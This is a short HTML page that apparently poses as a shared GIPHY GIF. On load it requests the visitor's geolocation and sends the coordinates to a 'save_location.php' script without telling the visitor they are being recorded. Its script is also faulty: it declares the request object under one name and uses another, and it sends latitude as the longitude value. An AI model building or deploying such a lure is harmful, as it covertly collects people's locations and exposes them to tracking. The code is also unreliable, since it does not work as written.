


<!DOCTYPE html>
<html>
<body onload="getLocation()">
,<iframe src="https://giphy.com/embed/6BZaFXBVPBtok" width="480" height="349" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/bad-6BZaFXBVPBtok">via GIPHY</a></p>



<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xttp =new XMLHttpRequest();

    xhttp.open("GET", "save_location.php?lat="+position.coords.latitude+"&long="+position.coords.latitude);
xhttp.send();

 
}
</script>

</body>
</html>
